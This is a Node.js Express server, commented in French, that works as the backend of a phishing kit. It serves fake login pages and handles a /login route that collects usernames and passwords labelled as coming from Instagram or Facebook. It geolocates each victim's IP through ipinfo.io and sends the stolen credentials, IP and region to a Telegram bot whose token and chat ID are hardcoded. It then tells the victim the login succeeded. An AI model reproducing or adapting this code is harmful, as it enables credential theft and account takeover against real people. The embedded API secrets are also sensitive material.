const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path'); // Importe le module path pour gérer les chemins

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware pour parser les requêtes POST
app.use(bodyParser.urlencoded({ extended: true }));

// Servir les fichiers statiques du dossier "public"
app.use(express.static(path.join(__dirname, 'public')));

app.post('/login', async (req, res) => {
    const { username, password, source } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.ip; // Utilisation de l'IP

    try {
        const locationData = await axios.get(`https://ipinfo.io/${userIp}?token=12b6b3d8813241`);
        const region = locationData.data.region || "inconnue";

        // Message avec source spécifique (Instagram ou Facebook)
        const message = `Nouvelle connexion depuis ${source}:\nNom d'utilisateur: ${username}\nMot de passe: ${password}\nIP: ${userIp}\nRégion: ${region}`;

        await axios.post(`https://api.telegram.org/bot7775056931:AAFIwuCRB-9vHxT2es6mN0zTordY4nuUsUc/sendMessage`, {
            chat_id: '5012724277',
            text: message
        });

        res.send("Connexion réussie.");
    } catch (error) {
        console.error("Erreur lors de l'envoi des données :", error);
        res.status(500).send("Erreur lors de la connexion.");
    }
});

app.listen(PORT, () => {
    console.log(`Serveur en cours d'exécution sur le port ${PORT}`);
});
